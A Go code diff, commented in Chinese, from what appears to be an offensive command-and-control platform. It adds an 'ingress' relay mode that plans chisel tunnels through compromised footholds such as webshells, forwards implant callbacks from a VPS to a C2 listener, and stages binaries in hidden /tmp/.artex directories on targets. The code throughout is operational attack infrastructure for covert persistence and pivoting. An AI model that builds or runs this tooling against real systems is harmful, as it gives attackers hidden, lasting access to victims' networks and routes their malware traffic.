@@ -20,7 +20,7 @@ import (
 // Plan 是完整部署计划 = deploy_params 持久化内容。所有进程台账（server_pid/
 // remote_pid/stage_token/远端路径）也回写进来，满足受管资源原则。
 type Plan struct {
-	Kind           string   `json:"kind"`                        // socks | portfwd
+	Kind           string   `json:"kind"`                        // socks | portfwd | ingress
 	Adapter        string   `json:"adapter"`                     // chisel
 	TaskID         int64    `json:"task_id"`                     // 归属任务
 	ViaSessionID   int64    `json:"via_session_id"`              // 经哪个立足点部署
@@ -48,6 +48,10 @@ type Plan struct {
 	TargetOS       string   `json:"target_os,omitempty"`     // 目标 OS（linux/darwin/windows）
 	TargetArch     string   `json:"target_arch,omitempty"`   // 目标架构（amd64/arm64/386/arm）
 	ClientBinary   string   `json:"client_binary,omitempty"` // 平台侧选定的目标端 chisel 二进制
+	// ingress 入站中继字段（目标回连 VPS，VPS 转发到平台 C2 loopback）：
+	PlatformChiselPort int    `json:"platform_chisel_port,omitempty"` // 平台 chisel server 端口
+	C2ListenerID       int64  `json:"c2_listener_id,omitempty"`       // 关联 C2 listener
+	C2CallbackHost     string `json:"c2_callback_host,omitempty"`     // 植入端回调的 VPS 公网 host
 	// suo5 适配器字段（omitempty，向后兼容既有 chisel deploy_params):
 	PayloadFile string `json:"payload_file,omitempty"` // 平台侧 payloads 目录里的文件名（suo5.php 等）
 	PayloadName string `json:"payload_name,omitempty"` // 目标侧随机文件名
@@ -58,19 +62,22 @@ type Plan struct {
 // PlanOpts 是计划生成输入。端口分配所需的占用集合与绑定检查由调用方注入，
 // 保持本包组装逻辑纯函数可测。
 type PlanOpts struct {
-	TaskID       int64
-	ViaSessionID int64
-	ListenHost   string // 空 = 0.0.0.0
-	ListenPort   int    // >0 = 固定平台侧监听端口（NAT/公网映射；0=自动分配）
-	CallbackHost string // 目标回连平台用的主机地址（config.CallbackAddr 的 host 部分）
-	TargetHost   string // portfwd 必填
-	TargetPort   int    // portfwd 必填
-	VerifyAddr   string // socks 决定性验证目标（通常立足点 webshell 的 host:port)
-	PortMin      int
-	PortMax      int
-	UsedPorts    map[int]bool        // 已占端口（活隧道台账）
-	CanListen    func(port int) bool // 真实可绑检查；nil 跳过
-	DataDir      string              // 平台侧隧道工作目录（authfile/日志）
+	TaskID             int64
+	ViaSessionID       int64
+	ListenHost         string // 空 = 0.0.0.0
+	ListenPort         int    // >0 = 固定平台侧监听端口（NAT/公网映射；0=自动分配）
+	CallbackHost       string // 目标回连平台用的主机地址（config.CallbackAddr 的 host 部分）
+	TargetHost         string // portfwd 必填
+	TargetPort         int    // portfwd/ingress 必填
+	PlatformChiselPort int    // ingress：平台 chisel server 端口
+	C2ListenerID       int64  // ingress：关联 C2 listener
+	C2CallbackHost     string // ingress：VPS 公网 host
+	VerifyAddr         string // socks 决定性验证目标（通常立足点 webshell 的 host:port)
+	PortMin            int
+	PortMax            int
+	UsedPorts          map[int]bool        // 已占端口（活隧道台账）
+	CanListen          func(port int) bool // 真实可绑检查；nil 跳过
+	DataDir            string              // 平台侧隧道工作目录（authfile/日志）
 }
 
 // newAuth 生成 auth 凭据：user 固定 "artex",pass 为 crypto/rand 16 字节 hex。
@@ -203,6 +210,65 @@ func PlanPortfwd(o *PlanOpts) (*Plan, error) {
 	p.TargetPort = o.TargetPort
 	p.assemble("R:127.0.0.1:" + strconv.Itoa(localPort) + ":" +
 		net.JoinHostPort(o.TargetHost, strconv.Itoa(o.TargetPort)))
+	return p, nil
+}
+
+// PlanIngress 生成入站中继计划：VPS 侧监听 ListenHost:ListenPort，
+// 经 chisel 客户端本地转发到平台 127.0.0.1:TargetPort（C2 listener）。
+// 平台 chisel server 固定监听 PlatformChiselPort；client 不建立平台反向入口。
+func PlanIngress(o *PlanOpts) (*Plan, error) {
+	if o.CallbackHost == "" {
+		return nil, fmt.Errorf("callback_host 必填（VPS 回连平台 chisel server 的公网 host）")
+	}
+	if o.C2CallbackHost == "" {
+		return nil, fmt.Errorf("c2_callback_host 必填（植入端回连的 VPS 公网 host）")
+	}
+	if o.ListenPort <= 0 {
+		return nil, fmt.Errorf("listen_port 必填（VPS 侧监听端口）")
+	}
+	if o.PlatformChiselPort <= 0 || o.PlatformChiselPort > 65535 {
+		return nil, fmt.Errorf("platform_chisel_port 必填且需在 1-65535")
+	}
+	if o.TargetPort <= 0 || o.TargetPort > 65535 {
+		return nil, fmt.Errorf("target_port 必填（平台 C2 listener 端口）")
+	}
+	targetHost := o.TargetHost
+	if targetHost == "" {
+		targetHost = "127.0.0.1"
+	}
+	listenHost := o.ListenHost
+	if listenHost == "" {
+		listenHost = "0.0.0.0"
+	}
+	user, pass, err := newAuth()
+	if err != nil {
+		return nil, err
+	}
+	tag, err := randTag()
+	if err != nil {
+		return nil, err
+	}
+	dir := o.DataDir
+	p := &Plan{
+		Kind: KindIngress, Adapter: AdapterChisel,
+		TaskID: o.TaskID, ViaSessionID: o.ViaSessionID,
+		ListenHost: listenHost, ListenPort: o.ListenPort,
+		TargetHost: targetHost, TargetPort: o.TargetPort,
+		PlatformChiselPort: o.PlatformChiselPort,
+		C2ListenerID:       o.C2ListenerID, C2CallbackHost: o.C2CallbackHost,
+		PlatformAddr: net.JoinHostPort(o.CallbackHost, strconv.Itoa(o.PlatformChiselPort)),
+		AuthUser:     user, AuthPass: pass,
+		AuthFile:  dir + "/chisel-" + tag + ".authfile",
+		ServerLog: dir + "/chisel-" + tag + ".server.log",
+		RemoteDir: "/tmp/.artex-" + tag, RemoteBin: "/tmp/.artex-" + tag + "/ch",
+		RemoteLog:  "/tmp/.artex-" + tag + "/run.log",
+		VerifyAddr: o.VerifyAddr,
+	}
+	p.ServerArgs = []string{"server", "--host", "0.0.0.0", "-p", strconv.Itoa(p.PlatformChiselPort), "--authfile", p.AuthFile}
+	p.ClientArgs = []string{
+		"client", "--keepalive", "10s", "http://" + p.PlatformAddr,
+		fmt.Sprintf("%s:%d:%s:%d", listenHost, p.ListenPort, targetHost, p.TargetPort),
+	}
 	return p, nil
 }
 
